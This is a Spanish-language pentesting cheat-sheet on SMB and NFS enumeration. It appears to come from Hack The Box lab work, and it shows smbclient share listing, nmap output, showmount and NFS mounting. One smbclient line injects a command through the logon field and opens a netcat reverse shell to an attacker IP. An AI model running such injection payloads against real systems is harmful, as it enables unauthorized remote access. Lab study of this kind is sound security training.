# SMB y NFS

Server Message Block (SMB) es un protocolo de red que permite compartir archivos, impresoras, etc, entre nodos de una red de computadoras que usan el sistema operativo Microsoft Windows. Este protocolo pertenece a la capa de aplicación en el modelo TCP/IP.
Hay muchas formas de atacar al protocolo SMB.

## Puertos

Normalmente en windows el mas significativo es el 445 aunque siempre acompañado del 139 y a veces del 135.

## Listado de recursos compartidos de forma anónima

### Con ***smbclient***
<pre>
# De forma genérica
smbclient -L 10.10.10.3 -N

# Indicando el protocolo
smbclient -L 10.10.10.3 -N --option="client min protocol=NT1"

# Indicando la ejecuión de un comando. Para ello ha de tener permisos.
# En este caso establece una SHELL reversa. Máquina Lame de HTB
smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c 'logon "/=`nohup nc -e /bin/bash 10.10.14.32 443`"'
  
</pre>

### Con ***nfs***

Podemos ver en un escaneo que hay unidades nfs montadas:

<pre>
# Nmap 7.92 scan initiated Thu Jun 23 12:05:08 2022 as: nmap -sCV -p21,111,135,139,49666 -oN targeted 10.10.10.180
Nmap scan report for remote.htb (10.10.10.180)
Host is up (0.047s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc       Microsoft Windows RPC
</pre>

Para ver que unidades nfs hay:

<pre>
showmount -e 10.10.10.180
</pre>

Montaje de una unidad:

<pre>
mount -t nfs 10.10.10.180:/site_backups /mnt/nfs
</pre>
